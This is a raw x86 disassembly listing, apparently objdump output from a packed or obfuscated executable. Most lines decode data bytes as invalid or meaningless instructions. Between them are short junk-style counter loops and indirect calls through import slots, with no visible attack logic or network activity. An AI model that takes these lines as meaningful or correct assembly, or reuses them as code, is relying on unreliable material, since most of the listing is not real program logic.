  409d2b:	pop    ebp
  409d2c:	xor    ebx,edi
  409d2e:	stos   BYTE PTR es:[edi],al
  409d2f:	pop    eax
  409d30:	stos   DWORD PTR es:[edi],eax
  409d31:	mov    ds:0x56c237f4,al
  409d36:	cwde   
  409d37:	lock cli 
  409d39:	lods   al,BYTE PTR ds:[esi]
  409d3a:	ret    
  409d3b:	pusha  
  409d3c:	dec    ebp
  409d3d:	inc    ebp
  409d3e:	inc    edi
  409d3f:	or     edx,ebx
  409d41:	fs js  0x409d9d
  409d44:	xchg   ebx,eax
  409d45:	xor    al,0x5f
  409d47:	lea    edx,[ebx+0x72]
  409d4a:	addr16 in eax,0xa4
  409d4d:	and    eax,0x78ff6287
  409d52:	mov    ch,0x90
  409d54:	out    dx,al
  409d55:	(bad)  
  409d57:	cmp    eax,0x47860ea0
  409d5c:	and    DWORD PTR [eax+0x76],eax
  409d5f:	cmp    BYTE PTR [eax],ch
  409d61:	nop
  409d62:	lock inc ebp
  409d64:	shr    BYTE PTR [ebx+0x7d139d89],cl
  409d6a:	shl    ah,cl
  409d6c:	jg     0x409dba
  409d6e:	lods   eax,DWORD PTR ds:[esi]
  409d6f:	jecxz  0x409d44
  409d71:	mov    ebp,0xc35a9a75
  409d76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d77:	xor    al,0x1b
  409d79:	pop    ebp
  409d7a:	mov    ah,0x75
  409d7c:	and    BYTE PTR [esi-0x7a9b6612],dh
  409d82:	leave  
  409d83:	mov    DWORD PTR ds:0x433617,0x34e7
  409d8d:	je     0x409da7
  409d93:	mov    ecx,DWORD PTR [ebp+0x14]
  409d96:	mov    edi,DWORD PTR ds:0x43360b
  409d9c:	sub    DWORD PTR ds:0x4336df,edi
  409da2:	mov    ecx,DWORD PTR [ecx]
  409da4:	mov    DWORD PTR [ebp-0x1c],ecx
  409da7:	or     DWORD PTR ds:0x433653,ebx
  409dad:	jmp    0x40a010
  409db2:	push   eax
  409db3:	call   FWORD PTR [esi+0x50697168]
  409db9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dba:	or     al,0x5f
  409dbc:	inc    edi
  409dbd:	pop    es
  409dbe:	inc    ebx
  409dbf:	lods   eax,DWORD PTR ds:[esi]
  409dc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409dc1:	or     bh,BYTE PTR [eax]
  409dc3:	loop   0x409e43
  409dc5:	jle    0x409dff
  409dc7:	jl     0x409e47
  409dc9:	jle    0x409d76
  409dcb:	and    ebp,DWORD PTR [ebp-0xb]
  409dce:	stos   BYTE PTR es:[edi],al
  409dcf:	push   edi
  409dd0:	stos   DWORD PTR es:[edi],eax
  409dd1:	jno    0x409e0b
  409dd3:	push   es
  409dd4:	int3   
  409dd5:	stos   DWORD PTR es:[edi],eax
  409dd6:	inc    ebx
  409dd7:	pop    ebp
  409dd8:	mov    eax,ds:0xd8c5f30d
  409ddd:	(bad)  
  409ddf:	adc    ch,BYTE PTR [ebx+0x72]
  409de2:	scas   al,BYTE PTR es:[edi]
  409de3:	in     al,dx
  409de4:	ss sysexit 
  409de7:	jbe    0x409da6
  409de9:	sub    DWORD PTR [edx+0x4b005192],ecx
  409def:	loop   0x409e62
  409df1:	mov    bx,WORD PTR gs:[edi-0x6050637c]
  409df9:	cmp    ebx,edi
  409dfb:	jmp    0x409de0
  409dfd:	arpl   WORD PTR ds:[eax+0x2a794222],bp
  409e04:	or     eax,0x94efcefd
  409e09:	pop    esi
  409e0a:	xor    esi,edi
  409e0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e0d:	pushf  
  409e0e:	jns    0x409e61
  409e10:	out    0xcf,eax
  409e12:	aam    0x1b
  409e14:	pop    eax
  409e15:	shl    BYTE PTR [ebx+0x25ebc359],0x28
  409e1c:	or     ecx,DWORD PTR [esi-0x49cda91]
  409e22:	pop    ebp
  409e23:	inc    ebp
  409e24:	and    ch,BYTE PTR es:[edx]
  409e27:	sub    DWORD PTR [ebx],edx
  409e29:	(bad)  
  409e2a:	stos   DWORD PTR es:[edi],eax
  409e2b:	fwait
  409e2c:	sbb    DWORD PTR [esi+0x18],edi
  409e2f:	mov    ch,cl
  409e31:	idiv   BYTE PTR [edx-0x7]
  409e34:	mov    ebx,ecx
  409e36:	inc    ebx
  409e37:	(bad)  [edi]
  409e39:	dec    edx
  409e3a:	imul   edi,ebp,0x4660445f
  409e40:	nop
  409e41:	add    bl,BYTE PTR [ebx+ecx*4+0x5e5ebc44]
  409e48:	loop   0x409df2
  409e4a:	scas   al,BYTE PTR es:[edi]
  409e4b:	ins    BYTE PTR es:[edi],dx
  409e4c:	shl    DWORD PTR [edx],0xc
  409e4f:	jge    0x409e02
  409e51:	inc    esp
  409e52:	pusha  
  409e53:	and    BYTE PTR [edx],al
  409e55:	repnz sub BYTE PTR [ebx+0x5e],bh
  409e59:	mov    DWORD PTR [esi+ecx*4+0x1cf5013e],0xec84fcd2
  409e64:	jmp    0xac2c:0x22b07efc
  409e6b:	ja     0x409e64
  409e6d:	cmp    BYTE PTR [ecx+0x1d],al
  409e70:	dec    ebp
  409e71:	adc    DWORD PTR [esi+0x2b],ebp
  409e74:	in     al,0x19
  409e76:	fwait
  409e77:	cwde   
  409e78:	dec    esi
  409e79:	sub    BYTE PTR [eax-0x13fcc5be],0xcc
  409e80:	cmp    dl,ch
  409e82:	inc    esi
  409e83:	or     BYTE PTR [ecx+0x6325b7a9],bh
  409e89:	and    BYTE PTR [eax-0x45],dl
  409e8c:	pop    esi
  409e8d:	cmp    BYTE PTR [ebx-0x2f],ah
  409e90:	js     0x409e70
  409e92:	addr16 mov ds:0x63a7,eax
  409e96:	test   DWORD PTR [edi-0x36],ebp
  409e99:	pop    ss
  409e9a:	mov    esp,0xad96a253
  409e9f:	mov    bl,0x5b
  409ea1:	loop   0x409ed1
  409ea3:	fsubr  st,st(0)
  409ea5:	sbb    ebx,ebx
  409ea7:	(bad)  
  409ea9:	inc    esi
  409eaa:	push   0x43cb4432
  409eaf:	cli    
  409eb0:	lods   eax,DWORD PTR ds:[esi]
  409eb1:	jle    0x409e61
  409eb3:	in     eax,0xf0
  409eb5:	dec    DWORD PTR [eax]
  409eb7:	xchg   ecx,eax
  409eb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409eb9:	mov    eax,ds:0x7b035786
  409ebe:	hlt    
  409ebf:	fld    DWORD PTR [edi+0x79]
  409ec2:	outs   dx,BYTE PTR ds:[esi]
  409ec3:	inc    BYTE PTR [eax-0x1fabef8e]
  409ec9:	fidiv  WORD PTR [ebp+0xa1b6946]
  409ecf:	loopne 0x409e88
  409ed1:	jmp    0x409e8b
  409ed3:	xchg   edi,eax
  409ed4:	dec    esi
  409ed5:	shl    DWORD PTR [edx],1
  409ed7:	add    al,0x99
  409ed9:	int    0xf3
  409edb:	leave  
  409edc:	add    al,0x7e
  409ede:	inc    esp
  409edf:	xchg   BYTE PTR [ecx-0x4f4680f7],ch
  409ee5:	retf   
  409ee6:	mov    dl,0x77
  409ee8:	lods   eax,DWORD PTR gs:[esi]
  409eea:	sar    BYTE PTR [eax],1
  409eec:	mov    ch,0x40
  409eee:	dec    ebx
  409eef:	fnstenv [esi]
  409ef1:	in     eax,dx
  409ef2:	(bad)  
  409ef3:	jp     0x409edd
  409ef5:	retf   0xe12e
  409ef8:	enter  0xfe99,0xee
  409efc:	sbb    BYTE PTR [ebp+0x15],0xf3
  409f00:	and    DWORD PTR ds:0xa052cfd,0xffffffce
  409f07:	cmp    ebx,DWORD PTR [eax+edx*8]
  409f0a:	loope  0x409ed8
  409f0c:	lea    eax,[ecx]
  409f0e:	stos   DWORD PTR es:[edi],eax
  409f0f:	and    eax,0xfba0c92e
  409f14:	inc    esp
  409f15:	jae    0x409f3b
  409f17:	dec    ebx
  409f18:	sub    dl,cl
  409f1a:	or     al,ah
  409f1c:	cmp    edx,DWORD PTR [eax]
  409f1e:	sub    BYTE PTR [ecx],ch
  409f20:	sub    eax,0xe2f511f7
  409f25:	std    
  409f26:	pop    ebx
  409f27:	sbb    esi,DWORD PTR [edi]
  409f29:	scas   eax,DWORD PTR es:[edi]
  409f2a:	pop    ebp
  409f2b:	wrmsr  
  409f2d:	ins    DWORD PTR es:[edi],dx
  409f2e:	test   bh,0xc5
  409f31:	jmp    0x409f51
  409f33:	jb     0x409f15
  409f35:	les    ebx,FWORD PTR [edi+ecx*1-0x14]
  409f39:	pop    ecx
  409f3a:	and    esp,DWORD PTR [edi+0x5e2c6fcb]
  409f40:	mov    bl,0x86
  409f42:	add    BYTE PTR [ecx-0x37],0xb3
  409f46:	scas   al,BYTE PTR es:[edi]
  409f47:	xchg   edi,eax
  409f48:	adc    DWORD PTR [ecx+0x4fd983d1],edx
  409f4e:	xchg   esp,eax
  409f4f:	daa    
  409f50:	dec    esp
  409f51:	aad    0x17
  409f53:	aaa    
  409f54:	and    eax,0x919284cc
  409f59:	std    
  409f5a:	(bad)  [esi+0x3c]
  409f5d:	sub    bh,ch
  409f5f:	push   es
  409f60:	xor    DWORD PTR [ecx],ebx
  409f62:	leave  
  409f63:	sub    BYTE PTR [ebx+0x40b544ff],dh
  409f69:	cmp    DWORD PTR [ebx],0x1d
  409f6c:	int3   
  409f6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f6e:	push   ebp
  409f6f:	pop    es
  409f70:	fst    QWORD PTR [esi+0x3b]
  409f73:	and    cl,BYTE PTR [edi]
  409f75:	mov    ch,0xfa
  409f77:	jne    0x409fd4
  409f79:	(bad)  
  409f7a:	or     al,0xe6
  409f7c:	sub    dl,al
  409f7e:	fbstp  TBYTE PTR [esi-0x35]
  409f81:	push   ecx
  409f82:	je     0x409fc2
  409f84:	fldenv [edx-0x4db4b94e]
  409f8a:	jmp    0xae1e0595
  409f8f:	mov    esi,0x701898bd
  409f94:	inc    ebx
  409f95:	dec    BYTE PTR [esi]
  409f97:	int3   
  409f98:	fbstp  TBYTE PTR [ebx]
  409f9a:	jmp    0x409f45
  409f9c:	xlat   BYTE PTR ds:[ebx]
  409f9d:	xor    DWORD PTR [ecx-0x65b51632],eax
  409fa3:	idiv   BYTE PTR [ebx+esi*8]
  409fa6:	int    0x7a
  409fa8:	pop    esp
  409fa9:	jl     0x409f8b
  409fab:	stos   BYTE PTR es:[edi],al
  409fac:	cmp    ebp,edi
  409fae:	or     bl,BYTE PTR [eax+0x63]
  409fb1:	clc    
  409fb2:	jmp    0xc9c26c51
  409fb7:	cmp    ah,0x75
  409fba:	lds    edi,FWORD PTR [ecx+ebp*4+0x4c]
  409fbe:	shl    BYTE PTR [ecx+ebx*1+0x6b],0x1d
  409fc3:	push   esp
  409fc4:	add    BYTE PTR [ebp-0x25],dl
  409fc7:	mov    bh,0x34
  409fc9:	cmc    
  409fca:	sbb    bh,BYTE PTR [esi]
  409fcc:	or     cl,BYTE PTR [ecx-0x54]
  409fcf:	cmp    BYTE PTR fs:[eax],ah
  409fd2:	mov    ds:0xcbe484ab,al
  409fd7:	(bad)  
  409fd8:	(bad)  [ebp-0x7366da0d]
  409fde:	and    eax,0x4ec50d56
  409fe3:	add    DWORD PTR [ebx+esi*1+0x15],ecx
  409fe7:	jb     0x409fa7
  409fe9:	repz aam 0x78
  409fec:	fucomp st(1)
  409fee:	pop    edx
  409fef:	adc    al,0x95
  409ff1:	aaa    
  409ff2:	ins    DWORD PTR es:[edi],dx
  409ff3:	fucom  st(4)
  409ff5:	xor    eax,esi
  409ff7:	nop
  409ff8:	cmp    eax,0x637d71e4
  409ffd:	sahf   
  409ffe:	xlat   BYTE PTR ds:[ebx]
  409fff:	push   edx
  40a000:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a001:	push   eax
  40a002:	fwait
  40a003:	pop    ebx
  40a004:	or     DWORD PTR [esi+0x5c2d24e3],ebx
  40a00a:	lods   eax,DWORD PTR ds:[esi]
  40a00b:	call   0xaf0f:0x3e7b9cc5
  40a012:	sar    BYTE PTR [ecx+0x4573],1
  40a018:	mov    edi,DWORD PTR ds:0x4336d3
  40a01e:	sbb    DWORD PTR ds:0x43360f,edi
  40a024:	add    edx,ecx
  40a026:	mov    esi,0x7879
  40a02b:	mov    edi,0x1556
  40a030:	xchg   esi,ecx
  40a032:	adc    DWORD PTR ds:0x433663,edi
  40a038:	sub    edx,edi
  40a03a:	and    ecx,DWORD PTR ds:0x433623
  40a040:	xor    esi,esi
  40a042:	and    DWORD PTR ds:0x43365b,0x0
  40a04c:	mov    ecx,DWORD PTR ds:0x43365b
  40a052:	inc    ecx
  40a053:	mov    DWORD PTR ds:0x43365b,ecx
  40a059:	cmp    DWORD PTR ds:0x43365b,0x2e
  40a060:	jne    0x40a076
  40a066:	push   0x43383e
  40a06b:	push   0x400000
  40a070:	call   DWORD PTR ds:0x4120dc
  40a076:	cmp    DWORD PTR ds:0x43365b,0x1f
  40a07d:	jb     0x40a04c
  40a083:	mov    DWORD PTR [ebp-0x28],esi
  40a086:	mov    DWORD PTR ds:0x43360b,0x11
  40a090:	cmp    DWORD PTR ds:0x43360b,0x0
  40a097:	je     0x40a0f0
  40a09d:	cmp    DWORD PTR ds:0x43360b,0x6
  40a0a4:	jne    0x40a0be
  40a0aa:	push   DWORD PTR [ebp-0x24]
  40a0ad:	push   0x64fc
  40a0b2:	push   DWORD PTR [ebp-0x24]
  40a0b5:	push   DWORD PTR [ebp-0x14]
  40a0b8:	call   DWORD PTR ds:0x4122a4
  40a0be:	cmp    DWORD PTR ds:0x43360b,0x7
  40a0c5:	jne    0x40a0d8
  40a0cb:	mov    ecx,DWORD PTR ds:0x43360b
  40a0d1:	dec    ecx
  40a0d2:	mov    DWORD PTR ds:0x43360b,ecx
  40a0d8:	mov    ecx,DWORD PTR ds:0x43360b
  40a0de:	dec    ecx
  40a0df:	mov    DWORD PTR ds:0x43360b,ecx
  40a0e5:	jmp    0x40a090
  40a0ea:	adc    DWORD PTR ds:0x433603,ecx
  40a0f0:	mov    DWORD PTR [ebp-0x2c],esi
  40a0f3:	mov    ecx,DWORD PTR ds:0x43366f
  40a0f9:	sub    ecx,DWORD PTR ds:0x433613
  40a0ff:	mov    DWORD PTR ds:0x43366f,ecx
  40a105:	mov    DWORD PTR [ebp-0x14],esi
  40a108:	or     DWORD PTR ds:0x433667,0x653d
  40a112:	mov    DWORD PTR [ebp-0x8],esi
  40a115:	jmp    0x40a378
  40a11a:	mov    gs,ebp
  40a11c:	data16 fwait
  40a11e:	gs mov cl,0x53
  40a121:	jmp    0x31127192
  40a126:	push   ss
  40a127:	in     eax,dx
  40a128:	sahf   
  40a129:	test   BYTE PTR [edx+0x387e7ee0],al
  40a12f:	jl     0x40a1af
  40a131:	jle    0x40a15c
  40a133:	fwait
  40a134:	sub    al,0x57
  40a136:	pop    ebx
  40a137:	and    eax,0xb842b587
  40a13c:	shl    ebx,cl
  40a13e:	dec    ebp
  40a13f:	pop    esp
  40a140:	sbb    DWORD PTR [edi+0x0],edx
  40a143:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a144:	jns    0x40a108
  40a146:	and    DWORD PTR [esi],ecx
  40a148:	out    0x64,al
  40a14a:	sbb    al,0x2c
  40a14c:	pop    es
  40a14d:	mov    ds:0xf0afd61e,eax
  40a152:	cmc    
  40a153:	cs aas 
  40a155:	inc    ebp
  40a156:	and    BYTE PTR ds:0xec247ddd,dl
  40a15c:	mov    ecx,0xce237dc9
  40a161:	cmp    edx,eax
  40a163:	and    DWORD PTR [ecx+0x3e],ebx
  40a166:	add    eax,0x516f85f0
  40a16b:	js     0x40a1c3
  40a16d:	add    ah,BYTE PTR [ebp+0x65c3f39f]
  40a173:	fsubr  DWORD PTR [edx+edi*4-0x3a]
  40a177:	leave  
  40a178:	adc    DWORD PTR [ecx],esp
  40a17a:	inc    ecx
  40a17b:	add    DWORD PTR [ebp+edx*4-0x74],ecx
  40a17f:	or     eax,0xf7272cd9
  40a184:	mov    fs,WORD PTR [ecx-0xcc0a93f]
  40a18a:	call   0xc0a99b5d
  40a18f:	pop    esp
  40a190:	cmp    DWORD PTR [esi-0x43],edi
  40a193:	rol    ebx,cl
  40a195:	xchg   ebp,eax
  40a196:	sbb    al,0x91
  40a198:	pop    esp
  40a199:	cmp    al,0x7e
  40a19b:	cmp    DWORD PTR [ecx],ecx
  40a19d:	dec    eax
  40a19e:	aam    0xb1
  40a1a0:	jbe    0x40a16d
  40a1a2:	pop    ecx
  40a1a3:	fimul  WORD PTR [ebx-0x53]
  40a1a6:	loop   0x40a213
  40a1a8:	out    dx,eax
  40a1a9:	cwde   
  40a1aa:	or     edi,edi
  40a1ac:	cli    
  40a1ad:	in     al,0xe8
  40a1af:	mov    dl,0x48
  40a1b1:	push   edx
  40a1b2:	cmp    DWORD PTR [edx+0x249cfa67],edx
  40a1b8:	adc    esp,ecx
  40a1ba:	mov    ecx,DWORD PTR [eax+0x4c]
  40a1bd:	int    0x9b
  40a1bf:	sbb    al,0x3b
  40a1c1:	sbb    DWORD PTR [eax+0x35fcdfbb],ebp
  40a1c7:	mov    DWORD PTR [edx+eax*4],ebp
  40a1ca:	add    dl,BYTE PTR [ebp+0x15043d0]
  40a1d0:	and    DWORD PTR [edx+0x57b976e5],esi
  40a1d6:	fwait
  40a1d7:	mov    bl,0xe9
  40a1d9:	jne    0x40a193
  40a1db:	mov    dh,0x88
  40a1dd:	xor    eax,0xd035ea5b
  40a1e2:	fdivr  st,st(0)
  40a1e4:	jnp    0x40a1ab
  40a1e6:	or     al,0x13
  40a1e8:	mov    eax,ds:0x2d638e3b
  40a1ed:	mov    edx,0x29ba6e3
  40a1f2:	fidivr DWORD PTR [ebx]
  40a1f4:	in     eax,0xd0
  40a1f6:	das    
  40a1f7:	aas    
  40a1f8:	std    
  40a1f9:	retfw  
  40a1fb:	adc    al,ah
  40a1fd:	mov    edi,edi
  40a1ff:	inc    eax
  40a200:	and    eax,0xe37b1a73
  40a205:	mov    edi,0x3dfce88b
  40a20a:	xchg   al,ah
  40a20c:	push   ecx
  40a20d:	les    ebx,FWORD PTR [ebp+0x30]
  40a210:	mov    bh,0xb2
  40a212:	das    
  40a213:	cs sbb eax,0x4e9c09dd
  40a219:	mov    WORD PTR [esi],fs
  40a21b:	ficom  DWORD PTR [edi-0x7a78dc93]
  40a221:	pop    ds
  40a222:	jmp    0x3784:0x635613bd
  40a229:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a22a:	add    al,0xa4
  40a22c:	dec    edi
  40a22d:	jmp    0x37ca7568
  40a232:	icebp  
  40a233:	dec    DWORD PTR [esi+ebp*8-0x11791fcf]
  40a23a:	lahf   
  40a23b:	mov    ah,0x43
  40a23d:	(bad)  
  40a23e:	jle    0x40a284
  40a240:	fcomp  DWORD PTR [ebp+edx*2+0x34]
  40a244:	popa   
  40a245:	arpl   di,ax
  40a247:	mov    bl,0x27
  40a249:	mov    DWORD PTR [edi],ebx
  40a24b:	popa   
  40a24c:	jge    0x40a1dd
  40a24e:	mov    esi,0xf1a82828
  40a253:	mov    esp,0xa80a0710
  40a258:	mov    bh,0x4b
  40a25a:	adc    DWORD PTR [edi],ebx
  40a25c:	sub    DWORD PTR [esi+0x51],ecx
  40a25f:	test   eax,0x82a777a6
  40a264:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a265:	xchg   esi,eax
  40a266:	add    ch,bh
  40a268:	cwde   
  40a269:	shl    BYTE PTR [ecx-0x75251515],0x1c
  40a270:	(bad)  
  40a271:	ins    BYTE PTR es:[edi],dx
  40a272:	iret   
  40a273:	clc    
  40a274:	jp     0x40a270
  40a276:	add    ecx,DWORD PTR [ecx+edi*4+0x2d]
  40a27a:	lea    esi,es:[edx-0x12c1017b]
  40a281:	and    al,0x1
  40a283:	inc    edx
  40a284:	sub    eax,DWORD PTR [edi+ebx*4]
  40a287:	sub    eax,0x7bdb677e
  40a28c:	dec    ecx
  40a28d:	jge    0x40a2df
  40a28f:	cmp    eax,0xac761697
  40a294:	hlt    
  40a295:	test   dh,cl
  40a297:	fldcw  WORD PTR [eax-0x498b1db9]
  40a29d:	scas   eax,DWORD PTR es:[edi]
  40a29e:	call   DWORD PTR [eax-0x2fab96b9]
  40a2a4:	inc    ecx
  40a2a5:	jae    0x40a23c
  40a2a7:	stc    
  40a2a8:	sub    BYTE PTR [edi+ebp*2-0x3f],ch
  40a2ac:	jg     0x40a2b2
  40a2ae:	pop    edi
  40a2af:	repz mov ds,WORD PTR [ecx-0x33]
  40a2b3:	clc    
  40a2b4:	adc    BYTE PTR [edi-0x659f8ca5],bl
  40a2ba:	xor    ebx,esi
  40a2bc:	ds int 0x33
  40a2bf:	adc    DWORD PTR [esi-0x3d],ebx
  40a2c2:	call   0xf1c2:0xf793bfc0
  40a2c9:	mov    ebx,0x1bb4196f
  40a2ce:	mov    ah,0xa5
  40a2d0:	jecxz  0x40a341
  40a2d2:	push   ss
  40a2d3:	pushf  
  40a2d4:	retf   0x8dac
  40a2d7:	push   0x1c
  40a2d9:	mov    ds:0xc6b422a8,eax
  40a2de:	sbb    ah,BYTE PTR [edx+0x332f98e2]
  40a2e4:	sub    al,0x46
  40a2e6:	in     eax,dx
  40a2e7:	push   ecx
  40a2e8:	add    esi,DWORD PTR [edx]
  40a2ea:	fiadd  WORD PTR [edx]
  40a2ec:	lods   eax,DWORD PTR ds:[esi]
  40a2ed:	cmc    
  40a2ee:	in     eax,0x9e
  40a2f0:	retf   
  40a2f1:	out    0x4a,eax
  40a2f3:	and    eax,0x4c8b888
  40a2f8:	or     ebp,DWORD PTR [ebx]
  40a2fa:	in     al,dx
  40a2fb:	in     eax,dx
  40a2fc:	data16 (bad) 
  40a2fe:	mov    esp,0xc86c4671
  40a303:	ins    BYTE PTR es:[edi],dx
  40a304:	push   0xffffff96
  40a306:	push   ss
  40a307:	cmp    BYTE PTR [ebx-0x2ce27065],ah
  40a30d:	fs jne 0x40a309
  40a310:	xchg   esi,eax
  40a311:	jne    0x40a2d8
  40a313:	cmp    BYTE PTR [edx+0x4d32a7ff],0x5f
  40a31a:	pop    ebp
  40a31b:	sar    dl,cl
  40a31d:	pop    esp
  40a31e:	or     edi,DWORD PTR [ecx]
  40a320:	and    eax,ebx
  40a322:	stc    
  40a323:	mov    cl,0x3f
  40a325:	test   eax,0x93c6e24b
  40a32a:	popa   
  40a32b:	mov    bl,cl
  40a32d:	pop    ds
  40a32e:	and    eax,0x22332267
  40a333:	into   
  40a334:	mov    ds:0x12129003,al
  40a339:	clc    
  40a33a:	repz inc ecx
  40a33c:	ret    0x5587
  40a33f:	xchg   ebx,eax
  40a340:	jne    0x40a2fa
  40a342:	addr16 gs test edi,ebx
  40a346:	push   esi
  40a347:	mov    WORD PTR [ebx-0x17486056],es
  40a34d:	xor    BYTE PTR [ecx+eiz*1],bl
  40a350:	ins    DWORD PTR es:[edi],dx
  40a351:	fwait
  40a352:	inc    ebp
  40a353:	in     eax,0x95
  40a355:	fisttp DWORD PTR [edx-0x2480783a]
  40a35b:	push   esp
  40a35c:	aaa    
  40a35d:	test   BYTE PTR [esi+0x76],cl
  40a360:	inc    edi
  40a361:	jbe    0x40a330
  40a363:	or     edx,DWORD PTR [ebx-0x13]
  40a366:	push   ds
  40a367:	add    ebp,edx
  40a369:	aad    0xed
  40a36b:	das    
  40a36c:	pop    ds
  40a36d:	sub    BYTE PTR [ebx-0x16],0xe
  40a371:	push   esp
  40a372:	ja     0x40a3c0
  40a374:	mov    cl,0xb
  40a376:	and    BYTE PTR [edi+0x33e84d8b],0xc8
  40a37d:	and    DWORD PTR ds:0x4335fb,0x0
  40a387:	jmp    0x40a39a
  40a38c:	xor    eax,eax
  40a38e:	xor    eax,DWORD PTR ds:0x4335fb
  40a394:	inc    eax
  40a395:	mov    ds:0x4335fb,eax
  40a39a:	cmp    DWORD PTR ds:0x4335fb,0x16
  40a3a1:	jae    0x40a3e1
  40a3a7:	cmp    DWORD PTR ds:0x4335fb,0x21
  40a3ae:	jne    0x40a3dc
  40a3b4:	push   DWORD PTR [ebp-0x10]
  40a3b7:	push   0x4336ef
  40a3bc:	push   DWORD PTR [ebp-0x1c]
  40a3bf:	push   0x43366b
  40a3c4:	push   0x6a7c
  40a3c9:	push   DWORD PTR [ebp-0x14]
  40a3cc:	push   0x4bcb
  40a3d1:	push   0x5e17
  40a3d6:	call   DWORD PTR ds:0x412358
  40a3dc:	jmp    0x40a38c
  40a3e1:	xor    edi,edi
  40a3e3:	mov    DWORD PTR ds:0x433667,0x1d
  40a3ed:	cmp    DWORD PTR ds:0x433667,0x0
  40a3f4:	je     0x40a44f
  40a3fa:	cmp    DWORD PTR ds:0x433667,0x3
  40a401:	jne    0x40a422
  40a407:	push   DWORD PTR [ebp-0xc]
  40a40a:	push   0x73f7
  40a40f:	push   DWORD PTR [ebp-0x24]
  40a412:	push   0x3e3a
  40a417:	push   0x433697
  40a41c:	call   DWORD PTR ds:0x4120e0
  40a422:	cmp    DWORD PTR ds:0x433667,0x4
  40a429:	jne    0x40a43a
  40a42f:	mov    eax,ds:0x433667
  40a434:	dec    eax
  40a435:	mov    ds:0x433667,eax
  40a43a:	mov    eax,ds:0x433667
  40a43f:	dec    eax
  40a440:	mov    ds:0x433667,eax
  40a445:	jmp    0x40a3ed
  40a44a:	or     eax,0x5ffd
  40a44f:	add    ecx,ebx
  40a451:	mov    DWORD PTR ds:0x43361f,0x630a
  40a45b:	mov    DWORD PTR [ebp-0x20],ecx
  40a45e:	mov    eax,ds:0x43372f
  40a463:	mov    eax,DWORD PTR [ebp-0x20]
  40a466:	je     0x40bc6c
  40a46c:	mov    eax,DWORD PTR [ebp-0x4]
  40a46f:	xor    eax,0x7510854
  40a474:	sbb    DWORD PTR ds:0x433723,0x4336a7
  40a47e:	add    eax,ebx
  40a480:	mov    DWORD PTR ds:0x433607,0x108a
  40a48a:	jmp    0x40a6ed
  40a48f:	imul   ecx,DWORD PTR [edx+eax*1+0x2f],0x21
  40a494:	jno    0x40a509
  40a496:	dec    eax
  40a497:	test   DWORD PTR [eax-0x44],esi
  40a49a:	pusha  
  40a49b:	call   0x7eee:0x4cf29685
  40a4a2:	jle    0x40a4dc
  40a4a4:	jl     0x40a524
  40a4a6:	jle    0x40a495
  40a4a8:	jle    0x40a4aa
  40a4aa:	pusha  
  40a4ab:	mov    WORD PTR [esi-0x64],gs
  40a4ae:	sahf   
  40a4af:	xor    BYTE PTR [eax],al
  40a4b1:	fstp   st(1)
  40a4b3:	and    al,0xda
  40a4b5:	mov    bl,0x22
  40a4b7:	aas    
  40a4b8:	sbb    eax,0xf3f17c0b
  40a4bd:	enter  0xf7c,0xd5
  40a4c1:	cmc    
  40a4c2:	fcmovbe st,st(5)
  40a4c4:	or     DWORD PTR [ebx+0x7c],eax
  40a4c7:	pop    edi
  40a4c8:	fdiv   QWORD PTR [edi+0x686de1c5]
  40a4ce:	dec    edi
  40a4cf:	test   BYTE PTR ds:0x1953111f,cl
  40a4d5:	or     ah,BYTE PTR [eax]
  40a4d7:	jle    0x40a4a8
  40a4d9:	jmp    0x40a509
  40a4db:	inc    ebx
  40a4dc:	inc    edx
  40a4dd:	icebp  
  40a4de:	sub    esi,DWORD PTR [edi]
  40a4e0:	std    
  40a4e1:	xchg   esi,eax
  40a4e2:	inc    edx
  40a4e3:	mov    WORD PTR [ebp+0x62b19b52],es
  40a4e9:	sbb    al,0x13
  40a4eb:	scas   eax,DWORD PTR es:[edi]
  40a4ec:	adc    esp,ecx
  40a4ee:	jae    0x40a4df
  40a4f0:	jp     0x40a50d
  40a4f2:	pop    ebx
  40a4f3:	imul   BYTE PTR [ecx+0x58]
  40a4f6:	mov    dh,0x42
  40a4f8:	lahf   
  40a4f9:	arpl   WORD PTR [esi],ax
  40a4fb:	retf   0xb89a
  40a4fe:	sub    eax,0x44cca878
  40a503:	pop    edi
  40a504:	fucompp 
  40a506:	xchg   BYTE PTR [edi],dh
  40a508:	arpl   WORD PTR [ecx],sp
  40a50a:	push   ecx
  40a50b:	aaa    
  40a50c:	xor    esp,DWORD PTR [ecx+edi*8-0x5b91d403]
  40a513:	cdq    
  40a514:	fdivrp st(2),st
  40a516:	pop    eax
  40a517:	xor    DWORD PTR [ebp-0xa59eb01],ecx
  40a51d:	push   eax
  40a51e:	(bad)  
  40a51f:	and    ah,BYTE PTR es:[ebx-0x39b6228]
  40a526:	shr    BYTE PTR [ecx-0xb82c9f0],cl
  40a52c:	jno    0x40a4c6
  40a52e:	jmp    0x1c0136e1
  40a533:	cs inc ecx
  40a535:	imul   edi,DWORD PTR [ebx],0x968531c8
  40a53b:	dec    eax
  40a53c:	int    0xe1
  40a53e:	adc    edi,0xffffffd9
  40a541:	add    al,0x8
  40a543:	fbstp  TBYTE PTR ds:0x7162e695
  40a549:	cmc    
  40a54a:	add    al,0x2a
  40a54c:	jecxz  0x40a59a
  40a54e:	xchg   BYTE PTR [ebx+0x7d8b420d],ah
  40a554:	jns    0x40a4f2
  40a556:	je     0x40a56d
  40a558:	inc    ebp
  40a559:	sbb    BYTE PTR [ecx-0x35],0xe7
  40a55d:	push   esi
  40a55e:	sbb    BYTE PTR [edx-0x6f5ef8e2],al
  40a564:	frstor [edx-0x36786279]
  40a56a:	inc    eax
  40a56b:	outs   dx,BYTE PTR ds:[esi]
  40a56c:	call   0x22caa714
  40a571:	push   edi
  40a572:	jmp    0x8283:0x8955d8cf
  40a579:	adc    ecx,esp
  40a57b:	sub    bl,BYTE PTR [eax-0xcfb3ef7]
  40a581:	inc    esp
  40a582:	add    eax,ecx
  40a584:	idiv   DWORD PTR ds:0xfb97db1
  40a58a:	(bad)
